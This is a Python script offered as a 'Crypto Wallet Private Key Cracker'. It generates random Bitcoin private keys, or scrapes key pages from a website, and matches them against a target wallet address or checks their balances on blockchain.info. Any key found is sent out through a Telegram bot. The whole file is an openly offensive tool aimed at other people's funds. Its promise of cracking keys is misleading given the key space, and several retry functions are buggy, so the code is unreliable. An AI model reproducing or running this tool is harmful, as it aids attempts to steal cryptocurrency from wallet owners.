# ================================================== #
# Crypto Wallet Private Key Cracker .
# ------------------------------------
# 2020-2022 Copyright (Dr.Linux) .
# ------------------------------------
# Coded By : Dr.Liux !
#
# GitHub Page ==> https://github.com/DrLinuxOfficial/CryptoWallet-Cracker
#
#
# Thank You For Use My Project :) !
# ================================================== #


from requests import get
from urllib.parse import quote
from bs4 import BeautifulSoup as BS
from bitcoinaddress import Wallet
from random import randint
import os
import hashlib
import time


class WalletDatabase:
    def __init__(self, number):
        self.url = ("https://lbc.cryptoguru.org/dio/" + (str(number)))

    def __Scraper__(self):
        try:
            res = get(self.url)
        except Exception:
            print("\n\033[36;1mTrying\033[0;m To \033[32;1mConnect\033[0;m \033[33;1mDatabase\033[0;m \033[31;1m...\033[0;m")
            time.sleep(0.5)
            self.__Scraper__()
        else:
            if res.status_code == 200:
                res = res.text
                res = BS(res, "html.parser")
                res = (res.find_all("span"))
                return res
            else:
                print("\n\033[36;1mTrying\033[0;m To \033[32;1mConnect\033[0;m \033[33;1mDatabase\033[0;m \033[31;1m...\033[0;m")
                time.sleep(0.5)
                self.__Scraper__()

    def GetWalletList(self):
        wl_tg = self.__Scraper__()
        wl_list = {}
        for tag in range((len(wl_tg))):
            if ((wl_tg[tag]).find_all("a")) == []:
                continue
            else:
                wl_list.update({f"Wallet{tag+1}":{"PubKey":(((wl_tg[tag]).find_all("a")[1].text).strip()), "PrvKey":(((wl_tg[tag]).span.text).strip())}})
        return wl_list


class WalletCipher:
    def __init__(self,
        x=55066263022277343669578718895168534326250603453777594175500187360389116729240,
        y=32670510020758816978083085130507043184471273380659243275938904335757337482424,
        p=2**256 - 2**32 - 2**9 - 2**8 - 2**7 - 2**6 - 2**4 - 1):
        self.x = x
        self.y = y
        self.p = p

    def __add__(self, data):
        return self.__radd__(data)

    def __radd__(self, data):
        if data is None:
            return self
        else:
            x1 = data.x
            y1 = data.y
            x2 = self.x
            y2 = self.y
            p = self.p
            if self == data:
                l = pow(2 * y2 % p, p-2, p) * (3 * x2 * x2) % p
            else:
                l = pow(x1 - x2, p-2, p) * (y1 - y2) % p
            newX = (l ** 2 - x2 - x1) % p
            newY = (l * x2 - l * newX - y2) % p
            return WalletCipher(newX, newY)

    def __mul__(self, data):
        return self.__rmul__(data)

    def __rmul__(self, data):
        n = self
        a = None
        for i in range(256):
            if data & (1 << i):
                a = a + n
            n = n + n
        return a

    def __ConvertBytes__(self):
        x = self.x.to_bytes(32, "big")
        y = self.y.to_bytes(32, "big")
        return b"\x04" + x + y


class WalletGenerator:
    def __init__(self):
        pass

    def __SHA256Converter__(self, data):
        digest_data = hashlib.new("sha256")
        digest_data.update(data)
        return digest_data.digest()

    def __RIPEMD160Converter__(self, data):
        ripemd_data = hashlib.new("ripemd160")
        ripemd_data.update(data)
        return ripemd_data.digest()

    def __Base58__(self, data):
        B58_data = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
        if data[0] == 0:
            return "1" + self.__Base58__(data[1:])
        x = sum([v * (256 ** i) for i, v in enumerate(data[::-1])])
        datas = ""
        while x > 0:
            datas = B58_data[x % 58] + datas
            x = x // 58
        return datas

    def __P2PKH_PublicKeyGenerator__(self, RDByte):
        cypher_obj = WalletCipher()
        pk = int.from_bytes(RDByte, "big")
        hash160 = self.__RIPEMD160Converter__(self.__SHA256Converter__((cypher_obj * pk).__ConvertBytes__()))
        address = b"\x00" + hash160
        address = self.__Base58__(address + self.__SHA256Converter__(self.__SHA256Converter__(address))[:4])
        return address

    def __P2WPKH_PublicKeyGenerator__(self, prvkey):
        return (((Wallet(prvkey)).address.__dict__["mainnet"].__dict__)["pubaddrbc1_P2WPKH"])

    def __PrivateKeyWIFGenerator__(self, RDByte):
        wif = b"\x80" + RDByte
        wif = self.__Base58__(wif + self.__SHA256Converter__(self.__SHA256Converter__(wif))[:4])
        return wif

    def __P2PKH_WalletGenerator__(self):
        rd_byte = os.urandom(32)
        return {"PubKey":(self.__P2PKH_PublicKeyGenerator__(rd_byte)), "PrvKey":(self.__PrivateKeyWIFGenerator__(rd_byte))}

    def __P2WPKH_WalletGenerator__(self):
        rd_byte = os.urandom(32)
        return {"PubKey":(self.__P2WPKH_PublicKeyGenerator__((self.__PrivateKeyWIFGenerator__(rd_byte)))), "PrvKey":(self.__PrivateKeyWIFGenerator__(rd_byte))}


class BTCCracker:
    def __init__(self, bot_token, chat_id):
        self.bot_token = bot_token
        self.chat_id = chat_id

    def __TelegramSender__(self, text):
        try:
            res_send = get(f"https://api.telegram.org/bot{self.bot_token}/sendMessage?chat_id={self.chat_id}&text={text}")
        except Exception:
            print("\n\033[36;1mTrying\033[0;m To \033[32;1mConnect\033[0;m \033[35;1mTelegram\033[0;m \033[31;1m...\033[0;m")
            time.sleep(0.5)
            self.__TelegramSender__(text)
        else:
            if res_send.status_code != 200:
                print("\n\033[36;1mTrying\033[0;m To \033[32;1mConnect\033[0;m \033[35;1mTelegram\033[0;m \033[31;1m...\033[0;m")
                time.sleep(0.5)
                self.__TelegramSender__(text)

    def __GetBalance__(self, wallet):
        try:
            res = get(("https://blockchain.info/balance?active="+wallet))
        except Exception:
            print("\n\033[36;1mTrying\033[0;m To \033[32;1mConnect\033[0;m \033[34;1mBlockchain.com\033[0;m \033[31;1m...\033[0;m")
            time.sleep(0.5)
            self.__GetBalance__(self, wallet)
        else:
            if res.status_code == 200:
                res = res.json()
                res = ((res[wallet]["final_balance"]) / 100000000)
                return res
            else:
                print("\n\033[36;1mTrying\033[0;m To \033[32;1mConnect\033[0;m \033[34;1mBlockchain.com\033[0;m \033[31;1m...\033[0;m")
                time.sleep(0.5)
                self.__GetBalance__(self, wallet)

    def __CheckDataFile__(self, data, file_name):
        if not (file_name) in (os.listdir("./")):
            open(file_name, "w").close()
        with open(file_name, "r") as f:
            return (data in (list(map(str.strip, (f.readlines())))))

    def P2PKH_OfflineAttack(self, wallet):
        self.__TelegramSender__((quote(f"""Crypto 💰 Wallet Cracker v2.0
Created By : Dr.Linux
➖➖➖➖➖➖➖➖
Crack Type ==> BTC
Mode 🛠 ==> Offline Attack (P2PKH)
Wallet ==> {wallet}
Starting Attack ‼️""")))
        while True:
            wallet_data = WalletGenerator()
            wallet_data = (wallet_data.__P2PKH_WalletGenerator__())
            if (self.__CheckDataFile__((wallet_data["PrvKey"]), (f"CheckedPrivateKey-{wallet}.txt"))) == False:
                if wallet_data["PubKey"] == wallet:
                    self.__TelegramSender__((quote(f"""Crypto 💰 Wallet Cracker v2.0
Created By : Dr.Linux
➖➖➖➖➖➖➖➖
Crack Type ==> BTC
Mode 🛠 ==> Offline Attack (P2PKH)
Wallet Address ==> {wallet}
➖➖➖➖➖➖➖➖
Private Key (WIF) : {(wallet_data['PrvKey'])}
➖➖➖➖➖➖➖➖
GitHub : https://github.com/DrLinuxOfficial/CryptoWallet-Cracker""")))
                    print("\n\033[32;1mSuccess\033[0;m \033[31;1m!!!\033[0;m\n")
                    break
                else:
                    with open((f"CheckedPrivateKey-{wallet}.txt"), "a") as f:
                        f.write((wallet_data["PrvKey"]))
                        f.write("\n")

    def P2WPKH_OfflineAttack(self, wallet):
        self.__TelegramSender__((quote(f"""Crypto 💰 Wallet Cracker v2.0
Created By : Dr.Linux
➖➖➖➖➖➖➖➖
Crack Type ==> BTC
Mode 🛠 ==> Offline Attack (P2WPKH)
Wallet ==> {wallet}
Starting Attack ‼️""")))
        while True:
            wallet_data = WalletGenerator()
            wallet_data = (wallet_data.__P2WPKH_WalletGenerator__())
            if (self.__CheckDataFile__((wallet_data["PrvKey"]), (f"CheckedPrivateKey-{wallet}.txt"))) == False:
                if wallet_data["PubKey"] == wallet:
                    self.__TelegramSender__((quote(f"""Crypto 💰 Wallet Cracker v2.0
Created By : Dr.Linux
➖➖➖➖➖➖➖➖
Crack Type ==> BTC
Mode 🛠 ==> Offline Attack (P2WPKH)
Wallet Address ==> {wallet}
➖➖➖➖➖➖➖➖
Private Key (WIF) : {(wallet_data['PrvKey'])}
➖➖➖➖➖➖➖➖
GitHub : https://github.com/DrLinuxOfficial/CryptoWallet-Cracker""")))
                    print("\n\033[32;1mSuccess\033[0;m \033[31;1m!!!\033[0;m\n")
                    break
                else:
                    with open((f"CheckedPrivateKey-{wallet}.txt"), "a") as f:
                        f.write((wallet_data["PrvKey"]))
                        f.write("\n")

    def P2PKH_OnlineAttack(self, wallet):
        self.__TelegramSender__((quote(f"""Crypto 💰 Wallet Cracker v2.0
Created By : Dr.Linux
➖➖➖➖➖➖➖➖
Crack Type ==> BTC
Mode 🛠 ==> Online Attack (P2PKH)
Wallet ==> {wallet}
Starting Attack ‼️""")))
        while True:
            page_number = (randint(1,904625697166532776746648320380374280100293470930272690489102837043110636675))
            if (self.__CheckDataFile__((str(page_number)), (f"CheckedPageDatabse-{wallet}.txt"))) == False:
                wallet_data = WalletDatabase(page_number)
                wallet_data = (wallet_data.GetWalletList())
                for i in wallet_data:
                    if (wallet_data[i]["PubKey"]) == wallet:
                        self.__TelegramSender__((quote(f"""Crypto 💰 Wallet Cracker v2.0
Created By : Dr.Linux
➖➖➖➖➖➖➖➖
Crack Type ==> BTC
Mode 🛠 ==> Online Attack (P2PKH)
Wallet Address ==> {wallet}
➖➖➖➖➖➖➖➖
Private Key (WIF) : {(wallet_data[i]['PrvKey'])}
➖➖➖➖➖➖➖➖
GitHub : https://github.com/DrLinuxOfficial/CryptoWallet-Cracker""")))
                        print("\n\033[32;1mSuccess\033[0;m \033[31;1m!!!\033[0;m\n")
                        os._exit(0)
                    else:
                        with open((f"CheckedPageDatabse-{wallet}.txt"), "a") as f:
                            f.write((str(page_number)))
                            f.write("\n")

    def P2WPKH_OnlineAttack(self, wallet):
        self.__TelegramSender__((quote(f"""Crypto 💰 Wallet Cracker v2.0
Created By : Dr.Linux
➖➖➖➖➖➖➖➖
Crack Type ==> BTC
Mode 🛠 ==> Online Attack (P2WPKH)
Wallet ==> {wallet}
Starting Attack ‼️""")))
        while True:
            page_number = (randint(1,904625697166532776746648320380374280100293470930272690489102837043110636675))
            if (self.__CheckDataFile__((str(page_number)), (f"CheckedPageDatabse-{wallet}.txt"))) == False:
                wallet_data = WalletDatabase(page_number)
                wallet_data = (wallet_data.GetWalletList())
                for i in wallet_data:
                    if ((WalletGenerator()).__P2WPKH_PublicKeyGenerator__((wallet_data[i]["PrvKey"]))) == wallet:
                        self.__TelegramSender__((quote(f"""Crypto 💰 Wallet Cracker v2.0
Created By : Dr.Linux
➖➖➖➖➖➖➖➖
Crack Type ==> BTC
Mode 🛠 ==> Online Attack (P2WPKH)
Wallet Address ==> {wallet}
➖➖➖➖➖➖➖➖
Private Key (WIF) : {(wallet_data[i]['PrvKey'])}
➖➖➖➖➖➖➖➖
GitHub : https://github.com/DrLinuxOfficial/CryptoWallet-Cracker""")))
                        print("\n\033[32;1mSuccess\033[0;m \033[31;1m!!!\033[0;m\n")
                        os._exit(0)
                    else:
                        with open((f"CheckedPageDatabse-{wallet}.txt"), "a") as f:
                            f.write((str(page_number)))
                            f.write("\n")

    def P2PKH_BalanceAttack(self):
        self.__TelegramSender__((quote("""Crypto 💰 Wallet Cracker v2.0
Created By : Dr.Linux
➖➖➖➖➖➖➖➖
Crack Type ==> BTC
Mode 🛠 ==> Balance Attack (P2PKH)
Starting Attack ‼️""")))
        while True:
            wallet_data = WalletGenerator()
            wallet_data = (wallet_data.__P2PKH_WalletGenerator__())
            if (self.__CheckDataFile__((wallet_data["PrvKey"]), "CheckedPrivateKey-Balance-P2PKH.txt")) == False:
                balance = self.__GetBalance__((wallet_data["PubKey"]))
                if balance > 0:
                    self.__TelegramSender__((quote(f"""Crypto 💰 Wallet Cracker v2.0
Created By : Dr.Linux
➖➖➖➖➖➖➖➖
Crack Type ==> BTC
Mode 🛠 ==> Balance Attack (P2PKH)
Wallet Address ==> {(wallet_data['PubKey'])}
Balance ==> {balance} BTC
➖➖➖➖➖➖➖➖
Private Key (WIF) : {(wallet_data['PrvKey'])}
➖➖➖➖➖➖➖➖
GitHub : https://github.com/DrLinuxOfficial/CryptoWallet-Cracker""")))
                    print("\n\033[32;1mSuccess\033[0;m \033[31;1m!!!\033[0;m\n")
                    break
                else:
                    with open("CheckedPrivateKey-Balance-P2PKH.txt", "a") as f:
                        f.write((wallet_data["PrvKey"]))
                        f.write("\n")

    def P2WPKH_BalanceAttack(self):
        self.__TelegramSender__((quote("""Crypto 💰 Wallet Cracker v2.0
Created By : Dr.Linux
➖➖➖➖➖➖➖➖
Crack Type ==> BTC
Mode 🛠 ==> Balance Attack (P2WPKH)
Starting Attack ‼️""")))
        while True:
            wallet_data = WalletGenerator()
            wallet_data = (wallet_data.__P2WPKH_WalletGenerator__())
            if (self.__CheckDataFile__((wallet_data["PrvKey"]), "CheckedPrivateKey-Balance-P2WPKH.txt")) == False:
                balance = self.__GetBalance__((wallet_data["PubKey"]))
                if balance > 0:
                    self.__TelegramSender__((quote(f"""Crypto 💰 Wallet Cracker v2.0
Created By : Dr.Linux
➖➖➖➖➖➖➖➖
Crack Type ==> BTC
Mode 🛠 ==> Balance Attack (P2WPKH)
Wallet Address ==> {(wallet_data['PubKey'])}
Balance ==> {balance} BTC
➖➖➖➖➖➖➖➖
Private Key (WIF) : {(wallet_data['PrvKey'])}
➖➖➖➖➖➖➖➖
GitHub : https://github.com/DrLinuxOfficial/CryptoWallet-Cracker""")))
                    print("\n\033[32;1mSuccess\033[0;m \033[31;1m!!!\033[0;m\n")
                    break
                else:
                    with open("CheckedPrivateKey-Balance-P2WPKH.txt", "a") as f:
                        f.write((wallet_data["PrvKey"]))
                        f.write("\n")

    def P2PKH_DatabaseBalanceAttack(self):
        self.__TelegramSender__((quote("""Crypto 💰 Wallet Cracker v2.0
Created By : Dr.Linux
➖➖➖➖➖➖➖➖
Crack Type ==> BTC
Mode 🛠 ==> Databse Balance Attack (P2PKH)
Starting Attack ‼️""")))
        while True:
            page_number = (randint(1,904625697166532776746648320380374280100293470930272690489102837043110636675))
            if (self.__CheckDataFile__((str(page_number)), "CheckedPageDatabse-Balance-P2PKH.txt")) == False:
                wallet_data = WalletDatabase(page_number)
                wallet_data = (wallet_data.GetWalletList())
                for i in wallet_data:
                    balance = self.__GetBalance__((wallet_data[i]["PubKey"]))
                    if balance > 0:
                        self.__TelegramSender__((quote(f"""Crypto 💰 Wallet Cracker v2.0
Created By : Dr.Linux
➖➖➖➖➖➖➖➖
Crack Type ==> BTC
Mode 🛠 ==> Databse Balance Attack (P2PKH)
Wallet Address ==> {(wallet_data[i]['PubKey'])}
Balance ==> {balance} BTC
➖➖➖➖➖➖➖➖
Private Key (WIF) : {(wallet_data[i]['PrvKey'])}
➖➖➖➖➖➖➖➖
GitHub : https://github.com/DrLinuxOfficial/CryptoWallet-Cracker""")))
                        print("\n\033[32;1mSuccess\033[0;m \033[31;1m!!!\033[0;m\n")
                        os._exit(0)
                else:
                    with open("CheckedPageDatabse-Balance-P2PKH.txt", "a") as f:
                        f.write((str(page_number)))
                        f.write("\n")

    def P2WPKH_DatabaseBalanceAttack(self):
        self.__TelegramSender__((quote("""Crypto 💰 Wallet Cracker v2.0
Created By : Dr.Linux
➖➖➖➖➖➖➖➖
Crack Type ==> BTC
Mode 🛠 ==> Databse Balance Attack (P2WPKH)
Starting Attack ‼️""")))
        while True:
            page_number = (randint(1,904625697166532776746648320380374280100293470930272690489102837043110636675))
            if (self.__CheckDataFile__((str(page_number)), "CheckedPageDatabse-Balance-P2WPKH.txt")) == False:
                wallet_data = WalletDatabase(page_number)
                wallet_data = (wallet_data.GetWalletList())
                for i in wallet_data:
                    p2wpkh_address = ((WalletGenerator()).__P2WPKH_PublicKeyGenerator__((wallet_data[i]["PrvKey"])))
                    balance = self.__GetBalance__(p2wpkh_address)
                    if balance > 0:
                        self.__TelegramSender__((quote(f"""Crypto 💰 Wallet Cracker v2.0
Created By : Dr.Linux
➖➖➖➖➖➖➖➖
Crack Type ==> BTC
Mode 🛠 ==> Databse Balance Attack (P2WPKH)
Wallet Address ==> {(p2wpkh_address)}
Balance ==> {balance} BTC
➖➖➖➖➖➖➖➖
Private Key (WIF) : {(wallet_data[i]['PrvKey'])}
➖➖➖➖➖➖➖➖
GitHub : https://github.com/DrLinuxOfficial/CryptoWallet-Cracker""")))
                        print("\n\033[32;1mSuccess\033[0;m \033[31;1m!!!\033[0;m\n")
                        os._exit(0)
                else:
                    with open("CheckedPageDatabse-Balance-P2WPKH.txt", "a") as f:
                        f.write((str(page_number)))
                        f.write("\n")
